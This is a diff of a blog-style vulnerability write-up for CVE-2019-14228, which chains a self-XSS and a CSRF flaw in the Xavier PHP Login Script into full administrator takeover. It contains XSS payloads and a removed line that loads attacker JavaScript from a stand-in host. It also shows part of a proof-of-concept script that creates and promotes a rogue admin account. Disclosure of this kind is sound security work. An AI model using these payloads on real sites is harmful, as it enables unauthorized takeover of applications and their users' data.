@@ -2,7 +2,7 @@
 layout: post
 title: CVE-2019-14228 
 tags: [CVE-Writeup]
-author: Maxim @ Ingredous Labs
+author: Ingredous Labs
 comment: true
 ---
 
@@ -11,61 +11,35 @@ comment: true
 https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14228
 ~~~
 
+# Introduction
 
-# i. Introduction
-In this post, I will detail my adventure of finding a bug with very low impact, and being able to leverage it into what essentially is an Application Takeover.
+Xavier 3.0 PHP Login Script & Management Panel is developed by Angry Frog and could be purchased by clicking [here](https://www.angry-frog.com/php-login-script/).
 
-While hunting around on the application, I found a section where you can create users. After playing around, I noticed that when the registration would fail due to errors in the form such as a invalid username, too short password, etc, the username that you were trying to register would reflect on the error page.
+As stated on their website:
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/fail.png)
+> The Xavier PHP Login Script is a user management system allowing the registration and administration of users to your website. 
 
-I then tried adding an XSS payload to see if the parameter would be sanitized in anyway. To my surprise, the parameter was not sanitized and I was able to trigger an XSS. 
+# Exploitation Details
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/xss.png)
+Xavier PHP Login Script allows Administrators to create new users by using the Management Panel. During a blackbox assessment, it was observed that causing the registration to fail such as using a password which doesn't meet the complexity policy would cause the application to reflect the username in the error message.
 
-However, this would be considered to be a `Self-XSS` which has very low impact as it requires social engineering in order to remotely exploit.
+Attempting to register a username which contains Javascript such as `<img src=/ onerror=alert(1)>`, would cause the Javascript to be evaluated and executed by the browser as no sanitization is being performed thhus resulting in XSS (Cross-Site-Scripting.)
 
+Unfortunately the impact here is completely mitigated as this would be a case of Self-XSS as the attacker would be required to either social engineer the Victim Administrator into inputting this payload along with causing the form to error.
 
-# ii. Chaining CSRF with XSS
+However upon further observation, it was noticed that the endpoint which is responsible for creating a new user was missing CSRF protection. As seen in the request, there is no CSRF protection in the form of a token being passed along in the request nor was the application utilizing Same-Site Cookies.
 
-Feeling a little defeated, I thought of some ways I could leverage this XSS into something bigger. While doing some more testing, I noticed that the endpoint which is responsible for creating the user did not have any CSRF protection. This gave me an idea to try to chain the Self-XSS with the CSRF to hopefully obtain remote exploitation.
+With this, an Attacker is able to craft a proof of concept and host it on their website which upon being visited by the Victim Admin will have the browser follow the request and thus create a new user. However one caveat lies here and that is when a new user is created, they are automatically placed into the "Registered Users" aka the lowest privilege group. Long story short, an attacker would be able to achieve the same impact by using the self-registration feature and registering their own account. 
 
-Here is an example of how the request looks like:
+In order to upgrade a user's privileges, an Admin will need to browse to the Management Panel and promote the user. The endpoint which is responsible for promoting the user utilizes CSRF protection thus making it impossible to promote the Attacker's user to Admin via the same vector (CSRF).
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf-payload.png)
+One last piece remains and that is the Self-XSS. With the CSRF an attacker is able to leverage the Self-XSS into being remotely exploitable in the form of Reflected XSS. As an attacker is able to execute Javascript in the context of the Victim's browser, they are now able to bypass the Same Origin Policy (SOP) which therefore would allow the attacker to bypass the CSRF protection found on the endpoint which is responsible for promoting a user's privileges by including specially crafted Javascript found in the Proof of Concept section below. 
 
-~~~
-Payload Used: <script>alert(1)</script>
-~~~
-
-After converting the request to a CSRF proof of concept, I put it to test:
+Upon the Javascript being executed in the context of the Victim Admin's browser, it will create a new account for the attacker and promote it to Administrator which is the highest privilege offered by the application thus allowing the attacker to effectively takeover the application by chaining Self-XSS + CSRF. 
 
 
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/csrf.gif)
+# Proof of Concept
 
-It works, now we are able to remotely exploit a Self-XSS!
-
-Do we stop here? No.
-
-
-# iii. Application Takeover
-
-Now that we are able to remotely exploit an XSS, what would be the impact? The obvious answer that comes to people's minds is stealing the session. However the application developers were one step ahead, and set the cookies to HTTPOnly. 
-
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/cookies.png)
-
-The way that the application flow works when creating a new user is:
-1. Register a new user
-2. Find the user in the user list, click their name to edit their profile
-3. Click the "promote to admin" button
-
-If you are thinking, if we have a CSRF, why go through all the trouble of having to execute Javascript. Well according to the application flow, with a CSRF we would only be able to create a registered user. A registered user has the same privileges, if I would've registered on the application myself. Furthermore the endpoint which is in charge of elevating the user's privileges has CSRF protection.
-
-With that in mind, I set off to find a way to be able to takeover the application chaining these two bugs.
-
-I then wrote simple Javascript, when called will create a new user and then promote the user. This is able to bypass SOP, as the request will be called from the application. Furthermore this is also able to bypass the CSRF protection when promoting a user to the administrator as we can create an XMLHTTPRequest to parse the CSRF token and then include it with our subsequent request.
-
-Host the following Javascript on your site:
 ~~~
 var root = "";
 var req = new XMLHttpRequest();
@@ -88,26 +62,4 @@ req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req2.send(params2);
 ~~~
 
-This will create a user with the username Hackerman, password: P4ssw0rd with Administrator privileges.
-
-Then use a payload such as:
-~~~
-<script src="https://your-site.com/xavier.js"></script>
-~~~
-
-Create a CSRF proof of concept with the payload above, and host it on your site.
-
-Executing the CSRF:
-
-![Screenshot]({{ site.baseurl }}/images/posts/2017/xavier/takeover.gif)
-
-
-So essentially with a Self-XSS and some creative thinking we were able to takeover an application. 
-
-
-# iv. Conclusion
-
-This was a great experience, and I've learned a lot. Remember when you have one piece of the puzzle, there are always ways to be able to leverage it into something bigger & greater. What normally would be treated as an informational bug, is able to be leveraged into something that can takeover the application.
-
-Best regards,<br>
-Maxim
+Upon this being executed, a new Administrator with the username of Hackerman and password of P4ssw0rd will created.
